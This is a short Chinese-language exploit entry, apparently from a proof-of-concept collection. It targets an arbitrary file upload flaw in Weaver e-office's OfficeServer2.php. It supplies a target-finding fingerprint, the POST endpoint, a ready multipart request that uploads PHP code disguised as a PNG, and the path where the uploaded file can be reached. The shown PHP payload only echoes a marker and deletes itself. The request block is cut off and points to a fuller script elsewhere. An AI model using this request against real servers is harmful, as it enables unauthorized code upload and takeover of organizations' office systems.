# 泛微e-officeOfficeServer2存在任意文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="泛微-EOffice"`
- **请求**：`POST /iWebOffice/OfficeServer2.php HTTP/1.1`

**请求体 / payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="FILENAME"
DudeSuite.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"
SAVEFILE
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test123.png"
<?php echo 'test123'; unlink(__FILE__); ?>
------WebKitFormBoundarySIELKZKzD7vQmdsO--
**上传定位：/attachment/****test123****.php**
POST /iWebOffice/OfficeServer…（脚本共 1143 字，完整版见原文）
```
- **预期**：200　|　—